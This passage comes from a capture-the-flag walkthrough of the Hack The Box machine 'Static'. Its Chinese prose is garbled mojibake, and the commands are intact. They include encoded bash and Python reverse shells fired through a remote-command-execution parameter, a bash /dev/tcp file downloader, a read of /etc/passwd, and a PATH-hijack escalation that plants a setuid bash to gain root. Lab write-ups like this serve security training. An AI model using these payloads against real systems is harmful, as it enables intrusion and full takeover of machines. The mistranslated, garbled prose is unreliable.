target="_blank">è¿™é‡Œ</a>å–ä¸€ä¸ªpentestmonkeyåå‘shellã€‚ç„¶åæˆ‘ä»¬ç”¨base64å’ŒURLç¼–ç å®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="25be" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# echo -n "/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.254.2/1337 0&gt;&amp;1'" | base64<br/>L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn</span></pre><p id="03b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†base64ç¼–ç å­—ç¬¦ä¸²æ”¾å…¥echoï¼Œè§£ç ï¼Œç„¶åä¼ é€’ç»™bashï¼Œä»¥ä¾¿èƒ½å¤Ÿåœ¨æœºå™¨ä¸Šå®‰å…¨åœ°æ‰§è¡Œã€‚URLä¹Ÿå¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨Pythonæ¥å®ç°:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="d97d" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# python3 -c "import urllib.parse; print(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\''))" <br/>/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27</span></pre><p id="ade7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰äº†åƒä»¥å‰ä¸€æ ·ä½¿ç”¨a=å‚æ•°çš„æœ‰æ•ˆè´Ÿè½½ã€‚æ‰€ä»¥æˆ‘ä»¬æœ€åçš„å‘½ä»¤çœ‹èµ·æ¥åƒè¿™æ ·:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="6fc9" class="mx km iq mt b gy my mz l na nb">./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27</span></pre><p id="e79b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨web boxä¸Šæ‰§è¡Œä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ‰“å¼€ç¬¬äºŒä¸ªSSHä¼šè¯ï¼Œncç­‰å¾…æ•è·shell:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="319e" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ssh -i id_rsa www-data@10.10.10.246 -p 2222                                     <br/>Last login: Sat Nov  6 16:04:52 2021 from 10.10.15.41<br/><br/>www-data@web:~$ cd /tmp<br/>www-data@web:/tmp$ ./nc -nlvp 1337<br/>listening on [any] 1337 ...</span></pre><p id="76fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ï¼Œå°†curlå‘½ä»¤ç²˜è´´åˆ°æˆ‘ä»¬åœ¨web boxä¸Šæ‰“å¼€çš„ç¬¬ä¸€ä¸ªSSHä¼šè¯ä¸­:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="1708" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ ./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27</span></pre><h1 id="fc46" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PKIæœåŠ¡å™¨åå‘å¤–å£³</h1><p id="2397" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åˆ‡æ¢åˆ°æˆ‘ä»¬çš„ç¬¬äºŒä¸ªSSHä¼šè¯ï¼Œçœ‹çœ‹æˆ‘ä»¬æœ‰ä¸€ä¸ªåå‘shellè¿æ¥åˆ°192.168.254.2ä¸Šçš„pkiç®±:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="7142" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ ./nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 34382<br/>bash: cannot set terminal process group (11): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@pki:~/html$</span></pre><p id="7f07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªlineræ¥åˆ›å»ºæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶åœ¨ä¸€ä¸ªç¨‹åºä¸­æ‰§è¡Œæ‰€æœ‰æ“ä½œ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="9a18" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ python3 -c "import urllib.parse; import os; PAYLOAD=('./curl-amd64 -s http://192.168.254.3/index.php?a='); PAYLOAD+=(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\'')); os.system(PAYLOAD)"</span></pre><p id="3a6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦ä¸€ä¸ªé€‰æ‹©æ˜¯ä½¿ç”¨<a class="ae nl" href="https://docs.python-requests.org/en/latest/user/quickstart/#make-a-request" rel="noopener ugc nofollow" target="_blank">è¯·æ±‚</a>åº“çš„Pythonè„šæœ¬:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="2233" class="mx km iq mt b gy my mz l na nb">#!/usr/bin/env python<br/>import requests<br/>payload = '/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\''<br/>requests.get("http://192.168.254.3/index.php?a="+payload)</span></pre><p id="0c9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœæ‚¨æƒ³è¿™æ ·åšï¼Œé‚£ä¹ˆå°†ä¸Šé¢çš„Pythonæ”¾åœ¨ä¸€ä¸ªåä¸ºscript.pyçš„æ–‡ä»¶ä¸­ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°box:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="6bc6" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# scp -P 2222 -i id_rsa script.py www-data@10.10.10.246:/tmp<br/>script.py                        100%  353    16.4KB/s   00:00</span></pre><p id="602f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶ååœ¨web boxä¸Šæ‰§è¡Œå®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="36e2" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ chmod +x script.py<br/>www-data@web:/tmp$ ./script.py</span></pre><p id="1da9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ç®¡æˆ‘ä»¬æ˜¯é€šè¿‡å“ªç§æ–¹å¼è·å¾—shellçš„ï¼Œç°åœ¨æ˜¯æ—¶å€™çœ‹çœ‹è¿™ä¸ªæ–°çš„pkiç›’å­äº†ã€‚ä½†æ˜¯è¿™é‡Œæ²¡æœ‰ä¸»æ–‡ä»¶å¤¹ï¼Œpasswdæ–‡ä»¶æ˜¾ç¤ºåªæœ‰rootç”¨æˆ·å¯ä»¥ç™»å½•:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="7d93" class="mx km iq mt b gy my mz l na nb">www-data@pki:~/html$ cat /etc/passwd<br/>cat /etc/passwd<br/>root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span></pre><h1 id="da45" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ä»£ç”¨é†‡</h1><p id="a977" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ—©äº›æ—¶å€™ï¼Œå½“è®¿é—®pkiç›’ä¸Šçš„ç«¯å£80æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä»¥ä¸‹å“åº”:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="789b" class="mx km iq mt b gy my mz l na nb">batch mode: /usr/bin/ersatool create|print|revoke CN</span></pre><p id="de9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯»æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿèƒ½æ‰¾åˆ°å®ƒçš„æºä»£ç :</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="8ee0" class="mx km iq mt b gy my mz l na nb">www-data@pki:~/html$ find / -name ersa* 2&gt;/dev/null<br/>find / -name ersa* 2&gt;/dev/null<br/>/usr/src/ersatool.c<br/>/usr/bin/ersatool</span></pre><p id="4185" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘æŸ¥çœ‹äº†æ›¿ä»£å·¥å…·çš„æºä»£ç ï¼Œä½†æ˜¯æˆ‘ä¸æ“…é•¿Cè¯­è¨€ï¼Œä¹Ÿä¸èƒ½ç†è§£å®ƒã€‚ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ã€‚cæ–‡ä»¶åˆ°Kaliï¼Œç¼–è¯‘å®ƒï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªç±»ä¼¼Ghidraçš„è°ƒè¯•å™¨æ¥åˆ†æå®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æˆ–è€…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a class="ae nl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank"> pspy64 </a>åƒæˆ‘ä»¬åœ¨å…¶ä»–ç›’å­ä¸Šåšçš„ä¸€æ ·ï¼Œä¾‹å¦‚<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/160" rel="noopener ugc nofollow" target="_blank">å†°å£¶</a>å’Œ<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/165" rel="noopener ugc nofollow" target="_blank">è€å¸ˆ</a>æ¥æŸ¥çœ‹è¿è¡Œè¿‡ç¨‹ã€‚æˆ‘è¦ç”¨pspy64ï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“ä½¿ç”¨ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬æŠŠå®ƒä¸‹è½½åˆ°Kaliï¼Œç„¶åå¤åˆ¶åˆ°webæœåŠ¡å™¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi oa"><img src="../Images/77c13c4414a22440961a1a41d9d41ba5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EgYWnG3BtcLmReDVKt2eMQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ä¸‹è½½pspy64å¹¶å¤åˆ¶åˆ°æœåŠ¡å™¨</figcaption></figure><p id="a7ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯¹äºweb boxä¸Šçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å¯åŠ¨æˆ‘ä»¬çš„webæœåŠ¡å™¨ï¼Œä»¥ä¾¿èƒ½å¤Ÿä»pki boxè®¿é—®å®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0799" class="mx km iq mt b gy my mz l na nb">www-data@web:/tmp$ python3 -m http.server<br/>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre><h1 id="f808" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Bash Wgetæ›¿ä»£</h1><p id="6cf4" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬éœ€è¦æŠŠpspy64æ”¾åˆ°pkiç›’å­é‡Œï¼Œè¿™å¹¶ä¸å®¹æ˜“ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ncã€wgetã€curlæˆ–å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿ã€‚æœç´¢æœ‰å¾ˆå¤šå…³äºå¦‚ä½•ä½¿ç”¨echoã€execã€sedå’Œå…¶ä»–å·¥å…·çš„ä¾‹å­ï¼Œæ¯”å¦‚<a class="ae nl" href="https://www.shell-tips.com/bash/download-files-from-shell" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ªã€<a class="ae nl" href="https://superuser.com/questions/40545/upgrading-and-installing-packages-through-the-cygwin-command-line/496572#496572" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ªæˆ–<a class="ae nl" href="https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ªã€‚</p><p id="b1fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åªéœ€å¤åˆ¶å…¶ä¸­ä¸€ä¸ªç¤ºä¾‹å¹¶ç²˜è´´åˆ°pkiæœåŠ¡å™¨ä¸Šçš„shellä¸­:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="e6f8" class="mx km iq mt b gy my mz l na nb">function _get() {<br/>    read proto server path &lt;&lt;&lt;$(echo ${1//// })<br/>    DOC=/${path// //}<br/>    HOST=${server//:*}<br/>    PORT=${server//*:}<br/>    [[ x"${HOST}" == x"${PORT}" ]] &amp;&amp; PORT=80<br/>    exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT<br/>    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" &gt;&amp;3<br/>    (while read line; do<br/>        [[ "$line" == $'\r' ]] &amp;&amp; break<br/>    done &amp;&amp; cat) &lt;&amp;3<br/>    exec 3&gt;&amp;-<br/>}</span></pre><p id="fed3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a140" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ _get http://192.168.254.2:8000/pspy64 &gt; pspy64<br/>_get http://192.168.254.2:8000/pspy64 &gt; pspy64<br/><br/>www-data@pki:/tmp$ ls -lsa p*<br/>ls -lsa p*<br/>3008 -rw-r--r-- 1 www-data www-data 3078592 Nov  6 20:47 pspy64<br/><br/>www-data@pki:/tmp$ chmod +x pspy64</span></pre><h1 id="dd7b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Pspy64</h1><p id="70ee" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¤åˆ¶äº†pspy64å¹¶ä½¿å…¶å¯æ‰§è¡Œï¼Œç°åœ¨æˆ‘ä»¬è¿è¡Œå®ƒï¼Œè®©å®ƒç›‘è§†æˆ‘ä»¬æ­£åœ¨åšçš„äº‹æƒ…:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi ob"><img src="../Images/4fae8a0edfaed3fb974ddf0e5db77c7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i9EFbVLsG_s2i9VYAo6EGw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">åœ¨ç›®æ ‡ä¸Šè¿è¡Œpspy64</figcaption></figure><p id="55d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“pspy64æ­£åœ¨è§‚å¯Ÿæ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¦ä¸€ä¸ªåˆ°pkiç›’çš„ä¼šè¯ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ä¸æ›¿ä»£å·¥å…·äº¤äº’ã€‚åªéœ€å¯¹base64å’ŒURLç¼–ç é‡å¤ä¸Šè¿°ç›¸åŒçš„è¿‡ç¨‹ï¼Œç„¶åå†æ¬¡ä½¿ç”¨web boxä¸Šçš„æ¼æ´è§¦å‘è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æˆ‘å°†ç«¯å£1338ç”¨äºç¬¬äºŒä¸ªåˆ°pkiç›’çš„è¿æ¥ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªè¿è¡Œpspy64çš„æ˜¯ç«¯å£1337:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="66ee" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ssh -i id_rsa www-data@10.10.10.246 -p 2222<br/>Last login: Sat Nov  6 21:56:12 2021 from 10.10.15.41<br/><br/>www-data@web:~$ cd /tmp<br/>www-data@web:/tmp$ ./nc -nlvp 1338<br/>listening on [any] 1338 ...<br/>connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 50620<br/>bash: cannot set terminal process group (16): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@pki:/tmp$</span></pre><p id="ee2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»£ç”¨å·¥å…·:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="b8fb" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ ersatool<br/>ersatool<br/># create<br/>create-&gt;CN=a<br/>client<br/>dev tun9<br/>proto udp<br/>remote vpn.static.htb 1194<br/>resolv-retry infinite<br/>nobind<br/>user nobody<br/>group nogroup<br/>persist-key<br/>persist-tun<br/><br/>remote-cert-tls server<br/><br/>cipher AES-256-CBC<br/>#auth SHA256<br/>key-direction 1<br/>verb 3<br/>&lt;ca&gt;<br/>-----BEGIN CERTIFICATE-----<br/>MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL<br/>BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw<br/>&lt;SNIP&gt;<br/>2aafeb626aadb6abc35fa023426c9334<br/>ea5f5af8329f367f112599f3e668bd7a<br/>-----END OpenVPN Static key V1-----<br/>&lt;/tls-auth&gt;<br/>create-&gt;CN=<br/># exit</span></pre><p id="4fb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºå¾ˆé•¿ï¼Œä»ä¸­å¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†å„ç§å¯†é’¥å’Œæ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬åˆ‡æ¢å›pkiæ¡†ä¸Šçš„å¦ä¸€ä¸ªä¼šè¯ï¼Œæˆ‘ä»¬ä¼šåœ¨pspy64ä¸­çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi oc"><img src="../Images/883f787aeca1faee452e12d6fc9f6a9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oWJVy7Rl5Xu1MvDaDf_96g.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Pspy64è¾“å‡º</figcaption></figure><h1 id="4bc5" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">è·¯å¾„å¼€å‘</h1><p id="3357" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ‰§è¡Œçš„ä¸€äº›å‘½ä»¤æ²¡æœ‰è·å¾—äºŒè¿›åˆ¶æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°mktempã€opensslå’Œmvéƒ½è¢«ç›´æ¥è°ƒç”¨ï¼Œè¿™æ„å‘³ç€ç¯å¢ƒå˜é‡ä¸­çš„è·¯å¾„è¢«ç”¨æ¥æŸ¥æ‰¾å®ƒä»¬ã€‚è¿™æ˜¯ä¸€ä¸ªä¼—æ‰€å‘¨çŸ¥çš„å‡çº§è·¯å¾„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥½çš„è§£é‡Š<a class="ae nl" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" rel="noopener ugc nofollow" target="_blank"/>ï¼Œæˆ‘åœ¨å¦ä¸€ä¸ªåä¸º<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/373" rel="noopener ugc nofollow" target="_blank">é¢„è§ˆ</a>çš„æ¡†ä¸­ä½¿ç”¨äº†ä¸€ä¸ªã€‚</p><p id="529f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨/tmpæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„åç§°æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„ä¸€ä¸ªå‘½ä»¤çš„åç§°ï¼Œä½†æ²¡æœ‰æŒ‡å®šè·¯å¾„ï¼Œæˆ‘å¯¹è¿™ä¸ªå‘½ä»¤ä½¿ç”¨çš„æ˜¯opensslã€‚pkiç›’å­ä¸Šæ²¡æœ‰æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬åœ¨Kaliä¸Šå®Œæˆå®ƒï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å°†base64å¤åˆ¶åˆ°ç›’å­ä¸Š:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="53e0" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# echo "#\!/bin/bash                                                                                           <br/>/bin/cp /bin/bash /tmp/bash<br/>chmod u+s /tmp/bash" | base64          <br/>IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK</span></pre><p id="8ebe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨å°†å®ƒç²˜è´´åˆ°boxä¸Šï¼Œè§£ç å›å¤šè¡Œbashè„šæœ¬ï¼Œå¹¶è¾“å‡ºåˆ°ä¸€ä¸ªåä¸ºopensslçš„æ–‡ä»¶:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="04f8" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ echo "IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK" | base64 -d &gt; openssl<br/>www-data@pki:/tmp$ ls -lsa<br/>ls -lsa<br/>   4 -rwxr-xr-x 1 www-data www-data      60 Nov  6 19:40 openssl</span></pre><p id="9915" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†æˆ‘ä»¬çš„/tmpè·¯å¾„æ·»åŠ åˆ°ç¯å¢ƒ$PATHå˜é‡çš„å¼€å¤´:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="3692" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ export PATH=/tmp:$PATH<br/>www-data@pki:/tmp$ echo $PATH  <br/>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></pre><h1 id="d00d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¹æ ‡å¿—</h1><p id="0efa" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">å›åˆ°å¦ä¸€ä¸ªç¯èŠ‚ï¼Œä¸ä»£ç”¨å·¥å…·äº’åŠ¨ã€‚ç„¶åå½“å®ƒè¯•å›¾ä½¿ç”¨opensslæ—¶ï¼Œå®ƒå°†ä½¿ç”¨æˆ‘ä»¬çš„ç‰ˆæœ¬ï¼Œå› ä¸º/tmpåœ¨å®é™…æ–‡ä»¶æ‰€åœ¨çš„/usr/binä¹‹å‰çš„è·¯å¾„åˆ—è¡¨ä¸­ã€‚</p><p id="8971" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ£€æŸ¥/tmpæ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹bashå·²è¢«å¤åˆ¶åˆ°å…¶ä¸­ï¼Œå¹¶ä¸”stickyä½å·²è¢«è®¾ç½®:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="d4f2" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ ls -lsa<br/>ls -lsa<br/>   4 -rwxr-xr-x 1 www-data www-data      40 Nov  6 19:33 openssl<br/>1088 -rws------ 1 root     www-data 1113504 Nov  6 19:38 bash</span></pre><p id="22ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ€åï¼Œæˆ‘ä»¬å¯ä»¥å‡çº§åˆ°rootå¹¶è·å–æ ‡å¿—:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="e582" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ bash -p<br/>id<br/>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)<br/>cat 